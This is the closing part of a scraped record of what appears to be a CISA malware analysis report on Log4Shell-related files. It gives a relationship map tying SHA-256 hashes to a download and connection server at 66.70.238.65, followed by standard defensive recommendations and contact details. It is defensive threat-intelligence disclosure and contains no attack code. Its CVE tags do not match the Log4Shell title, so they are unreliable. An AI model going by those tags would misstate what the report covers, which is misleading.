_By\n407d60626707baee29fb9f2597dd32cfd544ff46df7f76e51ff0b79b3ffce3f2\n\n\n66.70.238.65\nConnected_From\n76a2979d965d42f99558ca6ecd97734697249667291a3013d611e310a03f550e\n\n\n66.70.238.65\nContained_Within\n76a2979d965d42f99558ca6ecd97734697249667291a3013d611e310a03f550e\n\n\n66.70.238.65\nDownloaded_To\ne3d2e6b5cd422de1be7e6aa830b91115d204ba5e87c77b6431f3313e0930a697\n\n\n\n\nRelationship Summary\n\n\n\n\n1d459b9909...\nContains\n66.70.238.65\n\n\n1d459b9909...\nConnected_To\n66.70.238.65\n\n\n1d459b9909...\nDownloaded\ne3d2e6b5cd422de1be7e6aa830b91115d204ba5e87c77b6431f3313e0930a697\n\n\n1d459b9909...\nDownloaded\nc357879e2c1013dcf999bcdc65372eacf0895af4a4b4bad2b7d28108d3e7c46a\n\n\n1d459b9909...\nDownloaded\n4cdd06a36858ac32a09606bfecb54b517ad41a6aac1e37ca56bb1c193f8174cf\n\n\n1d459b9909...\nDownloaded\n42c844c62ad1b7ae1925973a9b6845b40d4f626a4895cba9ae9e3e3de3f7973a\n\n\n1d459b9909...\nDownloaded\n76a2979d965d42f99558ca6ecd97734697249667291a3013d611e310a03f550e\n\n\n76a2979d96...\nDownloaded_By\n1d459b9909adf98690635c62ea005009ede8eb9a665b8703fe2ad0b0c414816b\n\n\n76a2979d96...\nDownloaded\n4cdd06a36858ac32a09606bfecb54b517ad41a6aac1e37ca56bb1c193f8174cf\n\n\n76a2979d96...\nConnected_To\n66.70.238.65\n\n\n76a2979d96...\nDownloaded\ne3d2e6b5cd422de1be7e6aa830b91115d204ba5e87c77b6431f3313e0930a697\n\n\n76a2979d96...\nDownloaded\nc357879e2c1013dcf999bcdc65372eacf0895af4a4b4bad2b7d28108d3e7c46a\n\n\n76a2979d96...\nContains\n66.70.238.65\n\n\ne3d2e6b5cd...\nDownloaded_By\n1d459b9909adf98690635c62ea005009ede8eb9a665b8703fe2ad0b0c414816b\n\n\ne3d2e6b5cd...\nDownloaded_By\n76a2979d965d42f99558ca6ecd97734697249667291a3013d611e310a03f550e\n\n\ne3d2e6b5cd...\nDownloaded_From\n66.70.238.65\n\n\nc357879e2c...\nDownloaded_By\n1d459b9909adf98690635c62ea005009ede8eb9a665b8703fe2ad0b0c414816b\n\n\nc357879e2c...\nUsed\n66.70.238.65\n\n\nc357879e2c...\nDownloaded_By\n76a2979d965d42f99558ca6ecd97734697249667291a3013d611e310a03f550e\n\n\n4cdd06a368...\nDownloaded_By\n1d459b9909adf98690635c62ea005009ede8eb9a665b8703fe2ad0b0c414816b\n\n\n4cdd06a368...\nDownloaded_By\n76a2979d965d42f99558ca6ecd97734697249667291a3013d611e310a03f550e\n\n\n817046c4fe...\nContains\n66.70.238.65\n\n\n817046c4fe...\nConnected_To\n66.70.238.65\n\n\n817046c4fe...\nDownloaded\nb050749c87399f9978cc6eaea7d25405fc0d099a14c169f5c5f63b8b6ec98b0f\n\n\n817046c4fe...\nDownloaded\n6408217e10fac9f6549ffaaab328bcfeed4a7ebea71f3dcf60f6186e1b21b501\n\n\n817046c4fe...\nDownloaded\n407d60626707baee29fb9f2597dd32cfd544ff46df7f76e51ff0b79b3ffce3f2\n\n\n817046c4fe...\nDownloaded\n42c844c62ad1b7ae1925973a9b6845b40d4f626a4895cba9ae9e3e3de3f7973a\n\n\n817046c4fe...\nDownloaded_By\ne6bc8aa44233312058704b4d5954c45b4160841f470dd7f6d13c08940e61a7bb\n\n\ne6bc8aa442...\nDownloaded\nb050749c87399f9978cc6eaea7d25405fc0d099a14c169f5c5f63b8b6ec98b0f\n\n\ne6bc8aa442...\nDownloaded\n6408217e10fac9f6549ffaaab328bcfeed4a7ebea71f3dcf60f6186e1b21b501\n\n\ne6bc8aa442...\nDownloaded\n407d60626707baee29fb9f2597dd32cfd544ff46df7f76e51ff0b79b3ffce3f2\n\n\ne6bc8aa442...\nDownloaded\n817046c4fe89cd44dbb613cdac2f0c165e2b47d2b5245911ca6fabdda89d1691\n\n\ne6bc8aa442...\nContains\n66.70.238.65\n\n\ne6bc8aa442...\nConnected_To\n66.70.238.65\n\n\n6408217e10...\nDownloaded_From\n66.70.238.65\n\n\n6408217e10...\nDownloaded_By\n817046c4fe89cd44dbb613cdac2f0c165e2b47d2b5245911ca6fabdda89d1691\n\n\n6408217e10...\nDownloaded_By\ne6bc8aa44233312058704b4d5954c45b4160841f470dd7f6d13c08940e61a7bb\n\n\n407d606267...\nDownloaded_By\n817046c4fe89cd44dbb613cdac2f0c165e2b47d2b5245911ca6fabdda89d1691\n\n\n407d606267...\nDownloaded_By\ne6bc8aa44233312058704b4d5954c45b4160841f470dd7f6d13c08940e61a7bb\n\n\n407d606267...\nUsed\n66.70.238.65\n\n\nb050749c87...\nDownloaded_From\n66.70.238.65\n\n\nb050749c87...\nDownloaded_By\n817046c4fe89cd44dbb613cdac2f0c165e2b47d2b5245911ca6fabdda89d1691\n\n\nb050749c87...\nDownloaded_By\ne6bc8aa44233312058704b4d5954c45b4160841f470dd7f6d13c08940e61a7bb\n\n\n42c844c62a...\nDownloaded_From\n66.70.238.65\n\n\n42c844c62a...\nContains\n3b4d726bd366e7439367fa78a186dfa9b641d3b2ad354fd915581b6567480f94\n\n\n42c844c62a...\nContains\nfb833ecd1b1050304f364f879b8b1f7b7136e9c4a21aaf0a6c6b3f419e892d6d\n\n\n42c844c62a...\nDownloaded_By\n1d459b9909adf98690635c62ea005009ede8eb9a665b8703fe2ad0b0c414816b\n\n\n42c844c62a...\nDownloaded_By\n817046c4fe89cd44dbb613cdac2f0c165e2b47d2b5245911ca6fabdda89d1691\n\n\n3b4d726bd3...\nContained_Within\n42c844c62ad1b7ae1925973a9b6845b40d4f626a4895cba9ae9e3e3de3f7973a\n\n\nfb833ecd1b...\nContained_Within\n42c844c62ad1b7ae1925973a9b6845b40d4f626a4895cba9ae9e3e3de3f7973a\n\n\n66.70.238.65\nContained_Within\n1d459b9909adf98690635c62ea005009ede8eb9a665b8703fe2ad0b0c414816b\n\n\n66.70.238.65\nContained_Within\n817046c4fe89cd44dbb613cdac2f0c165e2b47d2b5245911ca6fabdda89d1691\n\n\n66.70.238.65\nConnected_From\n1d459b9909adf98690635c62ea005009ede8eb9a665b8703fe2ad0b0c414816b\n\n\n66.70.238.65\nConnected_From\n817046c4fe89cd44dbb613cdac2f0c165e2b47d2b5245911ca6fabdda89d1691\n\n\n66.70.238.65\nDownloaded_To\n6408217e10fac9f6549ffaaab328bcfeed4a7ebea71f3dcf60f6186e1b21b501\n\n\n66.70.238.65\nDownloaded_To\nb050749c87399f9978cc6eaea7d25405fc0d099a14c169f5c5f63b8b6ec98b0f\n\n\n66.70.238.65\nDownloaded_To\n42c844c62ad1b7ae1925973a9b6845b40d4f626a4895cba9ae9e3e3de3f7973a\n\n\n66.70.238.65\nContained_Within\ne6bc8aa44233312058704b4d5954c45b4160841f470dd7f6d13c08940e61a7bb\n\n\n66.70.238.65\nConnected_From\ne6bc8aa44233312058704b4d5954c45b4160841f470dd7f6d13c08940e61a7bb\n\n\n66.70.238.65\nUsed_By\nc357879e2c1013dcf999bcdc65372eacf0895af4a4b4bad2b7d28108d3e7c46a\n\n\n66.70.238.65\nUsed_By\n407d60626707baee29fb9f2597dd32cfd544ff46df7f76e51ff0b79b3ffce3f2\n\n\n66.70.238.65\nConnected_From\n76a2979d965d42f99558ca6ecd97734697249667291a3013d611e310a03f550e\n\n\n66.70.238.65\nContained_Within\n76a2979d965d42f99558ca6ecd97734697249667291a3013d611e310a03f550e\n\n\n66.70.238.65\nDownloaded_To\ne3d2e6b5cd422de1be7e6aa830b91115d204ba5e87c77b6431f3313e0930a697\n\n\n\n\nRecommendations\n\nCISA recommends that users and administrators consider using the following best practices to strengthen the security posture of their organization's systems. Any configuration changes should be reviewed by system owners and administrators prior to implementation to avoid unwanted impacts.\n\nMaintain up-to-date antivirus signatures and engines.\nKeep operating system patches up-to-date.\nDisable File and Printer sharing services. If these services are required, use strong passwords or Active Directory authentication.\nRestrict users' ability (permissions) to install and run unwanted software applications. Do not add users to the local administrators group unless required.\nEnforce a strong password policy and implement regular password changes.\nExercise caution when opening e-mail attachments even if the attachment is expected and the sender appears to be known.\nEnable a personal firewall on agency workstations, configured to deny unsolicited connection requests.\nDisable unnecessary services on agency workstations and servers.\nScan for and remove suspicious e-mail attachments; ensure the scanned attachment is its \"true file type\" (i.e., the extension matches the file header).\nMonitor users' web browsing habits; restrict access to sites with unfavorable content.\nExercise caution when using removable media (e.g., USB thumb drives, external drives, CDs, etc.).\nScan all software downloaded from the Internet prior to executing.\nMaintain situational awareness of the latest threats and implement appropriate Access Control Lists (ACLs).\n\nAdditional information on malware incident prevention and handling can be found in National Institute of Standards and Technology (NIST) Special Publication 800-83, \"Guide to Malware Incident Prevention & Handling for Desktops and Laptops\".\n\nContact Information\n\n\n1-888-282-0870\nCISA Central\u00a0(UNCLASS)\nCISA SIPR (SIPRNET)\nCISA IC (JWICS)\n\nCISA continuously strives to improve its products and services. You can help by answering a very short series of questions about this product at the following URL: https://us-cert.cisa.gov/forms/feedback/\n\nDocument FAQ\n\nWhat is a MAR? A Malware Analysis Report (MAR) is intended to provide organizations with more detailed malware analysis acquired via manual reverse engineering. To request additional analysis, please contact CISA and provide information regarding the level of desired analysis.\nCan I edit this document? This document is not to be edited in any way by recipients. All comments or questions related to this document should be directed to the CISA at 1-888-282-0870 or CISA Central.\nCan I submit malware to CISA? Malware samples can be submitted via three methods:\n\nWeb: https://malware.us-cert.gov\nE-Mail: submit@malware.us-cert.gov\nFTP: ftp.malware.us-cert.gov (anonymous)\n\nCISA encourages you to report any suspicious activity, including cybersecurity incidents, possible malicious code, software vulnerabilities, and phishing-related scams. Reporting forms can be found on CISA's homepage at www.cisa.gov.\n\n\n\n\n\n\n\n\nRevisions\n\nJuly 28, 2022: Initial version\n",
  "cves": [
    "CVE-2022-47966",
    "CVE-2022-42475"
  ],
  "techniques": [],
  "advisory": "ar22-203a",
  "title": "MAR-10386789-1.v1 \u2013 Log4Shell | CISA",
  "source": "analysis-reports",
  "id": "f43a8f68f8fbd18b824ca3d5f25b3c596e6583f06cd368a6e437b77e807b2e31"
}